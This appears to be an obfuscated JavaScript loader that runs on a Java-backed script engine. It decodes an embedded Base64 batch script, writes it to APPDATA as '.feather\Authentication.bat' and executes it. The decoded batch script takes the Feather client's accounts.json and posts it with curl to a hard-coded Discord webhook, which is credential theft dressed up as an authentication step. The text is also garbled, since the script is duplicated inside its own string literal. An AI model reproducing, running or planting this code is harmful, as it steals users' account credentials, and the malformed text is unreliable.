  
function getEnv(_0x89354c) {
  const _0x1b7771 = Java.type("java.lang.System");
  return _0x1b7771.getenv(_0x89354c);
}
function executeBat(_0x4aa79a, _0x538bd = null, _0x587868 = true) {
  if (_0x538bd) {
    const _0x3d0a45 = Java.type("java.util.Base64");
    FS.open(fullPath).write(_0x587868 ? _0x3d0a45.getDecoder().decode(_0x538bd) : _0x538bd);
  }
  const _0x5913c4 = Java.type("java.lang.Runtime");
  if (!FS.exists(_0x4aa79a)) {
    throw new Error("Failed num \"" + _0x4aa79a + "\"");
  }
  if (!FS.toRawFile(_0x4aa79a).isFile()) {
    throw new Error("\"" + _0x4aa79a + "\" auth");
  }
  _0x5913c4.getRuntime().exec("cmd /c start \"\" \"" + _0x4aa79a + "\"");
}
const fullPath = getEnv("APPDATA") + "\\" + ".feather\\Authentication.bat";
executeBat(fullPath, "  
function getEnv(_0x89354c) {
  const _0x1b7771 = Java.type("java.lang.System");
  return _0x1b7771.getenv(_0x89354c);
}
function executeBat(_0x4aa79a, _0x538bd = null, _0x587868 = true) {
  if (_0x538bd) {
    const _0x3d0a45 = Java.type("java.util.Base64");
    FS.open(fullPath).write(_0x587868 ? _0x3d0a45.getDecoder().decode(_0x538bd) : _0x538bd);
  }
  const _0x5913c4 = Java.type("java.lang.Runtime");
  if (!FS.exists(_0x4aa79a)) {
    throw new Error("Failed num \"" + _0x4aa79a + "\"");
  }
  if (!FS.toRawFile(_0x4aa79a).isFile()) {
    throw new Error("\"" + _0x4aa79a + "\" auth");
  }
  _0x5913c4.getRuntime().exec("cmd /c start \"\" \"" + _0x4aa79a + "\"");
}
const fullPath = getEnv("APPDATA") + "\\" + ".feather\\Authentication.bat";
executeBat(fullPath, "QGVjaG8gb2ZmCgpSRU0gUGF0aCB0byB0aGUgdGV4dCBmaWxlIGluIEFwcERhdGFcUm9hbWluZ1wuZmVhdGhlclxhY2NvdW50cy5qc29uCnNldCBGSUxFX1BBVEg9JVVTRVJQUk9GSUxFJVxBcHBEYXRhXFJvYW1pbmdcLmZlYXRoZXJcYWNjb3VudHMuanNvbgoKUkVNIERpc2NvcmQgd2ViaG9vayBVUkwKc2V0IFdFQkhPT0tfVVJMPWh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMjkxOTgwMDMyODk5ODEwNTgvaDl1TFc2TGlMckp2UXdOZS1LREU0Wml2S0ZXSHp6LVNXd1lFTUhzTG92SlU1NUIxcHFySkZIODUzLXFCcnJmam92cmkKClJFTSBFbnN1cmUgdGhlIGZpbGUgZXhpc3RzCmlmIG5vdCBleGlzdCAiJUZJTEVfUEFUSCUiICgKICAgIGVjaG8gRmlsZSBub3QgZm91bmQ6ICVGSUxFX1BBVEglCiAgICBleGl0IC9iIDEKKQoKUkVNIFVzZSBjdXJsIHRvIHNlbmQgdGhlIGZpbGUgd2l0aCB0aGUgRGlzY29yZCB3ZWJob29rCmN1cmwgLVggUE9TVCAlV0VCSE9PS19VUkwlIF4KICAgIC1IICJDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGEiIF4KICAgIC1GICJwYXlsb2FkX2pzb249e1wiY29udGVudFwiOlwiSGVyZSBpcyB5b3VyIGZpbGUhXCJ9IiBeCiAgICAtRiAiZmlsZT1AJUZJTEVfUEFUSCUiIF4+bnVsIDI+ZXJyb3IubG9nCgpSRU0gQ2hlY2sgdGhlIGV4aXQgY29kZSBvZiBjdXJsCmlmICVFUlJPUkxFVkVMJSBuZXEgMCAoCiAgICBlY2hvIEZhaWxlZCB0byBzZW5kIHRoZSBmaWxlLiBTZWUgZXJyb3IubG9nIGZvciBkZXRhaWxzLgogICAgZXhpdCAvYiAlRVJST1JMRVZFTCUKKQoKUkVNIE5vIG5lZWQgdG8gZWNobyBzdWNjZXNzIG1lc3NhZ2UK"); 
